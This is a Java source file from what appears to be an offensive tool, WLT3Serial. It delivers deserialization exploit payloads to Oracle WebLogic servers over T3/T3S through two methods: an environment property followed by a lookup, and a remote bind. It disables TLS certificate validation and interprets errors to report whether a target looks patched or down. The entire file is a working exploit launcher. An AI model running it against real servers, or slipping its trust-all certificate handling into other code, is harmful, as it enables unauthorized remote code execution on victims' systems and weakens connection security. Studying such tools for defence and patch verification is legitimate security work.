/*
	ContextExploit.java
	
	v0.2 ()
	
	Class for executing java deserialization exploit against WebLogic Servers by way of connection property (runPropertyExploit) or remote object bind (runBindExploit). 
*/

package bort.millipede.wlt3;

import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.CommunicationException;
import javax.naming.NameNotFoundException;
import javax.naming.NoInitialContextException;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;

class ContextExploit {
	static void runPropertyExploit(Object payload,String host,int port,boolean t3s,boolean verbose) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		//set connection properties
		Hashtable<String,Object> env = new Hashtable<String,Object>();
		env.put(Context.INITIAL_CONTEXT_FACTORY,"weblogic.jndi.WLInitialContextFactory");
		env.put(Context.PROVIDER_URL,protocol+"://"+host+":"+Integer.toString(port));

		//open connection and send payload
		Context ctx = null;
		try {
			if(t3s) { //if t3s connection is to be used, disable server certificate validation
				TrustManager[] trustAll = new TrustManager[] {new TrustAllCertsManager()};
				String tlsProtocol = System.getProperty("jdk.tls.client.protocols");
				if(tlsProtocol.contains("SSL")) {
					tlsProtocol = "SSL";
					WLT3Serial.enableSSL();
				}
				SSLContext defaultContext = SSLContext.getInstance(tlsProtocol);
				defaultContext.init(null,trustAll,null);
				SSLContext.setDefault(defaultContext);
			}
			
			ctx = new InitialContext(env);
			System.out.print("\b\b\b\bsucceeded!\n");
			System.out.println("Executing \"Property\" exploit method: Adding connection environment property containing object payload and performing lookup.");
			ctx.addToEnvironment("Prune_Tracy"+System.nanoTime(),payload); //connection environment property-based exploitation
			ctx.lookup("Prune_Tracy"+System.nanoTime());
			System.out.println("No Exception(s) thrown, exploitation appears successful!");
		} catch(CommunicationException ce) { //javax.naming.CommunicationException thrown: parse output
			parseCommunicationException(ce,protocol,host,port,verbose);
		} catch(NameNotFoundException nnfe) { //expected Exception thrown
			System.out.println("javax.naming.NameNotFoundException thrown, but this is normal for \"Property\" exploit method. Exploitation appears successful!"+(verbose ? "" : " Re-run with --verbose option to see full Exception output!"));
			if(verbose) {
				System.err.print("\n");
				nnfe.printStackTrace();
			}
		} catch (NoInitialContextException nice) {
			String message = nice.getMessage();
			if(message.contains("weblogic")) {
				System.out.println("\b\b\b\bfailed!");
				System.err.println("Error loading wlthint3client! Ensure that wlthint3client.jar file is in class path!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			} else {
				System.err.println("Unknown Intial Context Error occurred!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			}
			
			if(verbose) {
				System.err.print("\n");
				nice.printStackTrace();
			}
		} catch(Exception e) { //Unknown error
			System.err.println("Unknown Error occurred ("+e.getClass().getName()+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			if(verbose) {
				System.err.print("\n");
				e.printStackTrace();
			}
		} finally {
			try {
				ctx.close();
			}
			catch (Exception e) {
				//don't care
			}
		}
	}
	
	static void runBindExploit(Object payload,String host,int port,boolean t3s,boolean verbose) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		//set connection properties
		Hashtable<String,Object> env = new Hashtable<String,Object>();
		env.put(Context.INITIAL_CONTEXT_FACTORY,"weblogic.jndi.WLInitialContextFactory");
		env.put(Context.PROVIDER_URL,protocol+"://"+host+":"+Integer.toString(port));

		//open connection and send payload
		Context ctx = null;
		try {
			if(t3s) { //if t3s connection is to be used, disable server certificate validation
				TrustManager[] trustAll = new TrustManager[] {new TrustAllCertsManager()};
				String tlsProtocol = System.getProperty("jdk.tls.client.protocols");
				if(tlsProtocol.contains("SSL")) {
					tlsProtocol = "SSL";
					WLT3Serial.enableSSL();
				}
				SSLContext defaultContext = SSLContext.getInstance(tlsProtocol);
				defaultContext.init(null,trustAll,null);
				SSLContext.setDefault(defaultContext);
			}
			
			ctx = new InitialContext(env);
			System.out.print("\b\b\b\bsucceeded!\n");
			System.out.println("Executing \"Bind\" exploit method: Attempting to bind object payload to remote object.");
			ctx.bind("Check_For_Millipedes"+System.nanoTime(),payload); //context bind-based exploitation
			System.out.println("No Exception(s) thrown, exploitation appears successful!");
		} catch(CommunicationException ce) { //javax.naming.CommunicationException thrown: parse output
			parseCommunicationException(ce,protocol,host,port,verbose);
		} catch (NoInitialContextException nice) {
			String message = nice.getMessage();
			if(message.contains("weblogic")) {
				System.out.println("\b\b\b\bfailed!");
				System.err.println("Error loading wlthint3client! Ensure that wlthint3client.jar file is in class path!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			} else {
				System.err.println("Unknown Intial Context Error occurred!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			}
			
			if(verbose) {
				System.err.print("\n");
				nice.printStackTrace();
			}
		} catch (Exception e) { //Unknown Error
			System.err.println("Unknown Error occurred ("+e.getClass().getName()+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			if(verbose) {
				System.err.print("\n");
				e.printStackTrace();
			}
		} finally {
			try {
				ctx.close();
			} catch (Exception e) {
				//don't care
			}
		}
	}
	
	//parse output of expected javax.naming.CommunicationException thrown during attempted exploitation
	private static void parseCommunicationException(CommunicationException ce,String protocol,String host,int port,boolean verbose) {
		Throwable cause = ce.getCause();
		if(cause!=null) {
			String eType = cause.getClass().getName();
			switch(eType) {
				case "weblogic.rjvm.PeerGoneException": //Server forcefully closed connection, so server is likely patched
					System.err.println("Target WebLogic Server at "+protocol+"://"+host+":"+port+" forcefully closed "+protocol.toUpperCase()+" connection! Server seems to be patched!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					break;
				case "java.net.ConnectException":
					System.out.print("\b\b\b\bfailed!\n");
					String message = cause.getMessage();
					if(message!=null) {
						if(message.contains("java.io.IOException: Empty server reply")) { //Server may not be WebLogic server
							System.err.println("Target Server/Port at "+host+":"+port+" does not appear to be running "+protocol.toUpperCase()+"! Target may not be a WebLogic Server!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("java.net.ConnectException: Connection refused")) { //host is down or port is closed
							System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" refused! Target host appears to be down or port is closed!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("javax.net.ssl.SSLHandshakeException")) {
							if(message.contains("handshake_failure")) { //SSL Handshake failed due to mismatched supported protocols
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed (Handshake Error)! Try a different SSL/TLS connection protocol!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else if(message.contains("PKIX") && message.contains("unable to find valid certification path")) { //SSL Handshake failed due to untrusted certificate
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! Certificate validation error!");
								System.err.println("run InstallCert (https://github.com/escline/InstallCert) against the target server (java InstallCert -Djdk.tls.client.protocols=\""+System.getProperty("jdk.tls.client.protocols")+"\" "+host+":"+Integer.toString(port)+") then re-run WLT3Serial as: java -Djavax.net.ssl.trustStore=jssecacerts ..."+(verbose ? "" : "\nRe-run with --verbose option to see full error output!")); //can potentially be removed
							} else if(message.contains("Remote host closed connection during handshake")) { //SSL Handshake failed due to server not supporting encrypted connections
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed, Remote host closed connection during handshake! Target host/port may not be running an SSL/TLS service!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else { //SSL Handshake failed because server may only support clear-text connection
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! Target host/port may not be running an SSL/TLS service!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							}
						} else if(message.contains("javax.net.ssl.SSLException: Unsupported record version")) { //T3S connection failed due to mismatched supported protocols
							System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! Try a different SSL/TLS connection protocol!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("java.net.SocketException: Connection reset") && protocol.toUpperCase().equals("T3")) { //clear-text connection failed because server only supports encrypted connection
							System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Service may be running with SSL/TLS (use --t3s option)!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else { //Unknown Connection Error
							System.err.println("Unknown Connection Error occurred: connection failed"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						}
					}
					break;
				case "weblogic.socket.UnrecoverableConnectException":
					System.out.print("\b\b\b\bfailed!\n");
					message = cause.getMessage();
					if(message.contains("Login failed for an unknown reason") && protocol.toUpperCase().equals("T3")) { //clear-text connection failed because server only supports encrypted connection
						System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Service may be running with SSL/TLS (use --t3s option)!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					} else if(message.contains("Login failed for an unknown reason") && protocol.toUpperCase().equals("T3S")) { //encrypted connection failed because server only supports clear-text connection
						System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Target may not be a WebLogic Server!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					} else { //Unknown Unrecoverable Connection Error
						System.err.println("Unknown Unrecoverable Connection Error occurred!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					}
					break;
				default: //Unknown Connection Error
					System.out.println("\b\b\b\b???\n");
					System.err.println("Unknown Connection Error occurred ("+eType+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					break;
			}
		} else { //Unknown Communication Error
			System.out.println("\b\b\b\b???\n");
			System.err.println("Unknown Communication Error occurred!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
		}
		
		if(verbose) { //print full stack trace output if --verbose option is set
			System.err.print("\n");
			ce.printStackTrace();
		}
	}
}

